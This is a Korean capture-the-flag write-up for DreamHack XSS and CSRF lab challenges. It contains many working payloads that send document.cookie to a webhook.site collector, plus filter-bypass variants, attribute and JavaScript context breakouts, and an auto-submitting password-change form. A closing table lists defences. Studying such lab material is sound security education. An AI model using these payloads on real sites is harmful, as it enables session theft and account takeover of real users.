# DreamHack 라이트업 — XSS 시리즈

---

## 1. 개요

DreamHack 플랫폼의 XSS 실습 문제 풀이 정리입니다.  
각 문제에서 입력이 어떤 HTML 문맥에 삽입되는지 파악하고, 필터링 우회 또는 올바른 문맥 탈출로  
`document.cookie`를 외부로 전송하는 흐름을 단계별로 정리했습니다.

---

## 2. xss-1

### 문제 구조

```
[서버] /
  - 메모 저장 기능 (GET ?memo=<입력>)
  - /flag 엔드포인트: admin 봇이 특정 URL을 방문하여 플래그 쿠키 보유
```

### 취약점 분석

```python
# 서버 핵심 코드 (추정)
@app.route("/")
def index():
    memo = request.args.get("memo", "")
    return render_template_string(f"<p>{memo}</p>")
```

`memo` 파라미터가 HTML 인코딩 없이 `<p>` 태그 내부에 그대로 삽입됨.  
→ HTML 텍스트 문맥 → `<script>` 삽입 즉시 실행 가능.

### 공격 흐름

```
1. 드림핵 webhook 수신 URL 확보 (또는 requestbin)
2. 쿠키 전송 payload 작성
3. /flag 엔드포인트에 payload URL 제출
4. admin 봇이 URL 방문 → payload 실행 → 쿠키 전송
5. webhook에서 FLAG 확인
```

### Payload

```javascript
// 기본 payload — script 태그
<script>location.href='https://webhook.site/xxx?c='+document.cookie</script>

// img 태그 (script 필터 우회용 대안)
<img src=x onerror="location.href='https://webhook.site/xxx?c='+document.cookie">

// fetch 사용 (백그라운드 전송)
<script>fetch('https://webhook.site/xxx?c='+document.cookie)</script>
```

### 제출 URL 예시

```
http://host/flag?url=http://host/?memo=<script>location.href='https://webhook.site/xxx?c='+document.cookie</script>
```

---

## 3. xss-2

### 문제 구조

xss-1과 유사하지만 `<script>`, `on` 이벤트 핸들러 일부를 필터링.

### 필터 우회 분석

```
필터: <script>, onerror, onload 등 이벤트 핸들러 차단

우회 포인트:
- 대소문자 혼용: <Script>, <SCRIPT>
- 태그 중첩: <scr<script>ipt> (필터가 첫 번째만 제거하면 재조합됨)
- 이벤트 핸들러 변형: onmouseover, onfocus, ontoggle
- SVG/details 태그: <svg><animatetransform onbegin=...>
- iframe srcdoc 우회
```

### Payload 예시

```javascript
// 이벤트 핸들러 변형
<img src=x oNerRoR="location.href='https://webhook.site/xxx?c='+document.cookie">

// svg 태그 활용
<svg onload="fetch('https://webhook.site/xxx?c='+document.cookie)">

// details + autofocus
<details open ontoggle="fetch('https://webhook.site/xxx?c='+document.cookie)">

// script 태그 재조합 우회
<scr<script>ipt>location.href='https://webhook.site/xxx?c='+document.cookie</scr</script>ipt>
```

---

## 4. xss-filtering-1

### 문제 구조

더 강화된 필터링 환경. `<`, `>` 또는 특정 키워드를 차단하거나 인코딩.

### 분석 전략

1. **문맥 파악**: 입력이 태그 내부 attribute 값인지, JS 코드 내부인지, URL인지 확인
2. **인코딩 체인**: 서버가 HTML 디코딩 → 필터 → 출력 순서라면 이중 인코딩 시도
3. **attribute 문맥**: `value="<입력>"` 이면 `" onmouseover="...` 로 attribute 탈출

### Attribute 문맥 탈출 payload

```
입력값이 아래와 같이 삽입되는 경우:
  <input value="<입력값>">

payload:
  " autofocus onfocus="fetch('https://webhook.site/xxx?c='+document.cookie)
```

### JS 문맥 탈출 payload

```
입력값이 아래와 같이 삽입되는 경우:
  var name = "<입력값>";

payload:
  "; fetch('https://webhook.site/xxx?c='+document.cookie); //
```

---

## 5. csrf-1 (CSRF 응용)

### 문제 구조

XSS가 아닌 CSRF 문제. 관리자(admin 봇)가 URL을 방문할 때  
자동으로 특정 폼 요청을 보내도록 유도.

### 공격 흐름

```
1. 공격자: 자동 폼 제출 HTML 페이지 준비
2. /flag 엔드포인트에 해당 페이지 URL 제출
3. admin 봇이 페이지 방문 → 폼 자동 제출
4. 관리자 권한으로 비밀번호 변경 또는 플래그 노출
```

### Payload HTML

```html
<!-- 자동 제출 폼 -->
<html>
  <body onload="document.getElementById('f').submit()">
    <form id="f" method="POST" action="http://target/change_password">
      <input name="pw" value="hacked123">
    </form>
  </body>
</html>
```

---

## 6. 공통 접근 루틴

```
1. 소스코드 확인 (DreamHack은 대부분 소스 제공)
   → 입력 파라미터 / 출력 위치 / 필터 로직 확인

2. 문맥 파악
   → HTML 텍스트 / attribute / JS string / URL 중 어디에 삽입?

3. 필터 확인
   → 무엇을 막는가? 대소문자 구분? 재귀 필터?

4. Payload 작성
   → 기본 script → 이벤트 핸들러 → 태그 우회 → 인코딩 우회 순서

5. 외부 수신 설정
   → webhook.site / requestbin / ngrok + nc 중 하나

6. /flag 엔드포인트에 payload URL 제출
   → admin 봇이 방문 → cookie 수신
```

---

## 7. 영향도 및 학습한 점

| 구분 | 내용 |
|------|------|
| 핵심 원리 | 입력이 HTML 문맥에서 마크업으로 해석됨 |
| 탈취 대상 | document.cookie (세션 쿠키, 플래그) |
| 필터 우회 | 대소문자, 이벤트 핸들러 변형, SVG/details 태그 |
| 방어 핵심 | 출력 시 htmlspecialchars(), CSP, HttpOnly |

**학습한 점:**
- XSS 문제에서 소스코드를 먼저 읽고 필터 로직을 파악하는 것이 가장 효율적
- `<script>` 차단 시 이벤트 핸들러, SVG, details 태그가 좋은 대안
- `document.cookie` 외에도 `fetch()`로 내부 API 호출, DOM 조작 등 다양한 영향 가능
- CSP가 없는 환경에서는 `location.href` redirect가 가장 간단하고 확실한 전송 방법
- admin 봇 개념 — XSS 문제의 실제 공격 시나리오를 반영한 구조 (피해자 역할)
